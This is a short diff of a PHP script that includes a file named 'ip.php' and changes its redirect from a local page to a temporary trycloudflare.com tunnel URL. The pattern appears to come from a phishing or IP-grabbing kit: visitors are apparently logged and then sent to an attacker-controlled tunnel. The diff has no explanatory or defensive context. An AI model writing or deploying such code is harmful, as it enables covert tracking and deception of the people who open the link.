@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: /index.html');
+header('Location: https://folk-improve-conversation-classified.trycloudflare.com/index.html');
 exit
 ?>
